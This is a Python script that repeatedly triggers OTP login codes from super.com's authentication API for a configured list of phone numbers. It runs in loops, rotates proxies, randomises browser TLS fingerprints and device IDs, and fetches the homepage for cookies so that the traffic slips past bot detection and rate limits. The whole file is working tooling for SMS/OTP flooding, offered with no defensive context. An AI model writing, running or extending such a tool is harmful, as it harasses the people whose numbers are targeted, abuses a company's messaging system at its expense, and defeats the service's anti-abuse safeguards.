import json
import logging
import time
import random
import uuid
import sys
from curl_cffi import requests

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] %(message)s', datefmt='%H:%M:%S')
logger = logging.getLogger(__name__)

def load_config(config_path="config.json"):
    try:
        with open(config_path, 'r') as f:
            return json.load(f)
    except Exception as e:
        logger.error(f"Failed to load {config_path}: {e}")
        sys.exit(1)

def load_proxies(proxy_file):
    proxies = []
    try:
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                parts = line.split(':')
                if len(parts) == 4:
                    host, port, user, password = parts
                    proxy_url = f"http://{user}:{password}@{host}:{port}"
                    proxies.append(proxy_url)
                else:
                    logger.warning(f"Invalid proxy format (skipping): {line}")
        logger.info(f"Loaded {len(proxies)} proxies from {proxy_file}")
        return proxies
    except Exception as e:
        logger.error(f"Failed to load proxies from {proxy_file}: {e}")
        return []

def send_super_otp(phone_number, proxy_url):
    # Elite Level Randomization: Pick a random modern browser profile
    # This automatically changes TLS fingerprint, JA3 hash, HTTP2 frames, and User-Agent!
    impersonate_profiles = ["chrome110", "chrome101", "edge99", "safari15_3", "safari15_5"]
    browser_profile = random.choice(impersonate_profiles)
    
    logger.info(f"[{phone_number}] Using browser profile: {browser_profile}")
    
    # Generate completely new random identifiers for this "device"
    device_id = str(uuid.uuid4())
    request_id = str(uuid.uuid4())
    
    # Configure session with proxy and impersonation
    proxies = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    session = requests.Session(impersonate=browser_profile, proxies=proxies)
    
    url = "https://www.super.com/snapcommerce/api/trpc/authentication.cognitoCreateUserOrLogIn"
    
    headers = {
        'accept': '*/*',
        'accept-language': 'en-US,en;q=0.9',
        'content-type': 'application/json',
        'origin': 'https://www.super.com',
        'referer': 'https://www.super.com/',
    }
    
    payload = {
        "body": {
            "request_id": request_id,
            "data": {
                "auth_contact_identifier": {
                    "brand": "ST",
                    "contact_type": "PHONE_NUMBER",
                    "contact_value": phone_number
                },
                "profile": {
                    "device_id": device_id,
                    "platform_data": {
                        "os": "Windows" if "chrome" in browser_profile or "edge" in browser_profile else "macOS"
                    }
                }
            }
        },
        "queryParams": {}
    }
    
    try:
        # Step 1: Hit homepage to generate fresh initial session cookies like a real user
        session.get("https://www.super.com/", headers={'referer': 'https://google.com/'})
        
        # Step 2: Send the OTP API request
        logger.info(f"[{phone_number}] Sending OTP POST request...")
        response = session.post(url, headers=headers, json=payload)
        
        if response.status_code == 200:
            logger.info(f"[{phone_number}] ✅ SUCCESS: OTP Sent!")
            return True
        else:
            logger.error(f"[{phone_number}] ❌ Failed. Status: {response.status_code} | {response.text[:100]}")
            return False
            
    except Exception as e:
        logger.error(f"[{phone_number}] ❌ Error during request: {e}")
        return False

def main():
    config = load_config()
    numbers = config.get("numbers", [])
    proxy_file = config.get("proxy_file", ".txt")
    loop_count = config.get("loop_count", 1)
    wait_time = config.get("wait_between_otp_seconds", 5)
    
    if not numbers:
        logger.error("No numbers found in config.json!")
        return
        
    proxy_list = load_proxies(proxy_file)
    proxy_index = 0
    total_proxies = len(proxy_list)
    
    logger.info("==================================================")
    logger.info(f"ELITE SUPER.COM BOT STARTED")
    logger.info(f"Numbers Loaded: {len(numbers)}")
    logger.info(f"Loops to execute: {loop_count}")
    logger.info(f"Wait between OTPs: {wait_time}s")
    logger.info("==================================================")
    
    for loop in range(1, loop_count + 1):
        logger.info(f"\n--- Starting Loop {loop}/{loop_count} ---")
        
        for number in numbers:
            # Cycle through proxies
            current_proxy = None
            if total_proxies > 0:
                current_proxy = proxy_list[proxy_index % total_proxies]
                proxy_index += 1
                # Hide password for logs
                safe_proxy_log = current_proxy.split('@')[-1]
                logger.info(f"[{number}] Selected Proxy: {safe_proxy_log}")
            else:
                logger.warning(f"[{number}] No proxies available! Sending direct request.")
                
            send_super_otp(number, current_proxy)
            
            logger.info(f"Waiting {wait_time} seconds before next request...")
            time.sleep(wait_time)
            
    logger.info("\n🎉 All loops completed successfully!")

if __name__ == "__main__":
    main()
